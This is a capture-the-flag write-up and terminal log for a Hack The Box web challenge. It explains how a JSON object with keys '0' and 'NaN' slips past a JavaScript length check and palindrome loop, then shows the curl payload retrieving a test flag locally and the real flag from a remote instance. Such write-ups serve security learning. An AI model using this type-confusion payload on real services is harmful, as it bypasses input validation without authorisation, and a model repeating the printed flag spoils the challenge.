@@ -1,0 +1,163 @@
+To derive the exploitation command, a systematic code analysis and testing process is followed:
+  ### 1. Identifying the Constraints
+
+  By examining the project files, we identify two conflicting rules:
+
+  •  nginx.conf : The line  client_max_body_size 75;  limits the HTTP request body to 75 bytes.
+  •  index.mjs : The line  if (string.length < 1000)  requires the input string length to be at least 1000 characters.
+
+  Since 1000 characters of text exceed 75 bytes, a standard string input is impossible to transmit. This indicates we must pass an object that bypasses the length
+  check.
+  ──────
+  ### 2. Analyzing JavaScript Type Behavior
+
+  We analyze how the  IsPalinDrome  function handles an object rather than a string:
+
+    const IsPalinDrome = (string) => {
+        if (string.length < 1000) {
+            return 'Tootus Shortus';
+        }
+        // ...
+    
+  If we pass a JSON object  {} , the property  string.length  is  undefined .
+  In JavaScript:
+
+  •  undefined < 1000  evaluates to  false .
+  • This bypasses the first check.
+  ──────
+  ### 3. Evaluating the Loop
+
+  Next, the function initializes an array using the length property:
+
+    for (const i of Array(string.length).keys())
+    
+  With  string.length  being  undefined , this becomes  Array(undefined) .
+  In JavaScript,  Array(undefined)  creates an array with one element:  [undefined] . Its keys iterator yields only the index  0 .
+  The loop runs exactly once, where  i = 0 .
+  ──────
+  ### 4. Resolving the Indexes
+
+  Inside the loop, the characters are compared:
+
+    const original = string[i]; // string[0]
+    const reverse = string[string.length - i - 1]; // string[undefined - 0 - 1] -> string[NaN]
+    
+  Because arithmetic operations with  undefined  result in  NaN ,  string.length - i - 1  resolves to  NaN .
+  The comparison becomes:
+
+    if (string[0] !== string[NaN] || typeof string[0] !== 'string')
+    ──────
+  ### 5. Constructing the Payload
+
+  To prevent the function from returning an error:
+
+  • Both  string[0]  and  string[NaN]  must exist.
+  • Both must be strings.
+  • Both must be equal to each other.
+
+  This leads to the JSON structure:
+
+    {
+      "palindrome": {
+        "0": "a",
+        "NaN": "a"
+      }
+    }  
+
+  We verify that the size of this payload is 34 bytes, which is well below the 75-byte limit.
+  ──────
+  ### 6. Writing the Command
+
+  Finally, we package this JSON payload into a  curl  command targeting the endpoint:
+
+  • We use  -X POST  because the application expects a POST request.
+  • We add  -H "Content-Type: application/json"  to specify the JSON format.
+  • We attach the payload using the  -d  option.
+
+  ### Summary of Work
+
+  • Explained the logical steps to locate and analyze the conflicting constraints.
+  • Walked through the JavaScript evaluation steps of  undefined  and  NaN  properties.
+  • Showed how the target JSON structure and the resulting  curl  command are constructed.
+
+──(white㉿white)-[~/Documents/htb/orion]
+└─$ cd web_magical_palindrome 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$ ls
+app  config  Dockerfile  flag.txt  start.sh
+                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$ ls -ltr
+total 20
+drwxrwxr-x 2 white white 4096 Nov 12  2025 config
+drwxrwxr-x 2 white white 4096 Nov 12  2025 app
+-rw-rw-r-- 1 white white   26 Nov 12  2025 flag.txt
+-rw-rw-r-- 1 white white  482 Nov 12  2025 Dockerfile
+-rw-rw-r-- 1 white white  814 Nov 12  2025 start.sh
+                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$ chmod +x start.sh        
+                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$ ./start.sh 
+[*] Stopping and removing existing container...
+[*] Removing existing image...
+[*] Building Docker image: web_magical_palindrome_release
+[+] Building 163.5s (15/15) FINISHED                                                                                                                    docker:default
+ => [internal] load build definition from Dockerfile                                                                                                              0.0s
+ => => transferring dockerfile: 521B                                                                                                                              0.0s 
+ => [internal] load metadata for docker.io/library/node:20-slim                                                                                                   3.8s 
+ => [internal] load .dockerignore                                                                                                                                 0.1s
+ => => transferring context: 2B                                                                                                                                   0.0s 
+ => [internal] load build context                                                                                                                                 0.1s 
+ => => transferring context: 5.75kB                                                                                                                               0.0s
+ => [ 1/10] FROM docker.io/library/node:20-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0                                          84.1s
+ => => resolve docker.io/library/node:20-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0                                             0.0s
+ => => sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0 6.49kB / 6.49kB                                                                    0.0s
+ => => sha256:3d0f05455dea2c82e2f76e7e2543964c30f6b7d673fc1a83286736d44fe4c41c 1.93kB / 1.93kB                                                                    0.0s 
+ => => sha256:9da6b4e352d0d5c94963eba1832408f5b7b08839cd8be9b6610c05de5118c704 6.88kB / 6.88kB                                                                    0.0s 
+ => => sha256:ff86ea2e5edce334d19a34fbc65d1a511aa1fc823dba1110422f991aa56b44d4 28.24MB / 28.24MB                                                                 45.4s 
+ => => sha256:e54aec64c365815cd7b91e718f00ac6e625562b1de09036b38614621b42c7582 3.31kB / 3.31kB                                                                    1.1s
+ => => sha256:804d4d68057cbb26cbcde9a735148ebc6589911bad32cf9dbddb5b0ba878bf1f 41.42MB / 41.42MB                                                                 82.2s
+ => => sha256:64cfb949317c9824fd081d55c59a7225bfe1f650c6395ba42d7ed0ccf51993d2 1.71MB / 1.71MB                                                                    6.7s
+ => => sha256:3c02fd806613748139b8b8a14a69ae3518a1b0e863c57c35aada3b92ed87fb31 447B / 447B                                                                        7.1s
+ => => extracting sha256:ff86ea2e5edce334d19a34fbc65d1a511aa1fc823dba1110422f991aa56b44d4                                                                         1.7s
+ => => extracting sha256:e54aec64c365815cd7b91e718f00ac6e625562b1de09036b38614621b42c7582                                                                         0.0s
+ => => extracting sha256:804d4d68057cbb26cbcde9a735148ebc6589911bad32cf9dbddb5b0ba878bf1f                                                                         1.6s
+ => => extracting sha256:64cfb949317c9824fd081d55c59a7225bfe1f650c6395ba42d7ed0ccf51993d2                                                                         0.1s
+ => => extracting sha256:3c02fd806613748139b8b8a14a69ae3518a1b0e863c57c35aada3b92ed87fb31                                                                         0.0s 
+ => [ 2/10] RUN apt-get update && apt-get install -y     nginx     supervisor     && rm -rf /var/lib/apt/lists/*                                                 72.2s 
+ => [ 3/10] WORKDIR /app                                                                                                                                          0.1s 
+ => [ 4/10] COPY app/package.json ./                                                                                                                              0.1s 
+ => [ 5/10] RUN npm install                                                                                                                                       2.3s 
+ => [ 6/10] COPY app/ ./                                                                                                                                          0.1s 
+ => [ 7/10] COPY config/nginx.conf /etc/nginx/nginx.conf                                                                                                          0.1s 
+ => [ 8/10] COPY config/supervisord.conf /etc/supervisor/conf.d/supervisord.conf                                                                                  0.1s 
+ => [ 9/10] RUN mkdir -p /var/log/nginx /var/log/supervisor /run                                                                                                  0.2s
+ => [10/10] COPY flag.txt /flag.txt                                                                                                                               0.1s
+ => exporting to image                                                                                                                                            0.4s 
+ => => exporting layers                                                                                                                                           0.4s
+ => => writing image sha256:ea1f2682f042241ab562c92a7a4980ff42c0b6bcc204d5a1283e903f2a6df354                                                                      0.0s
+ => => naming to docker.io/library/web_magical_palindrome_release                                                                                                 0.0s 
+[+] Build successful!                                                                                                                                                  
+8a7414a84194556e171c05b0ed7b5f9e6e1cbfabead06c984e0dae247df0f6cd
+[+] Container started successfully!
+[+] Access the application at: http://127.0.0.1:12349
+                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$  curl -X POST http://127.0.0.1:12349/ \                                              
+         -H "Content-Type: application/json" \
+         -d '{"palindrome":{"0":"a","NaN":"a"}}'
+Hii Harry!!! HTB{FAKE_FLAG_FOR_TESTING}                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$ http://154.57.164.65:31006/
+                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$  curl -X POST http://154.57.164.65:31006/ \
+         -H "Content-Type: application/json" \
+         -d '{"palindrome":{"0":"a","NaN":"a"}}'
+
+Hii Harry!!! HTB{Lum0s_M@x!ma}                                                                                                                                                                       
+┌──(white㉿white)-[~/Documents/htb/orion/web_magical_palindrome]
+└─$ 
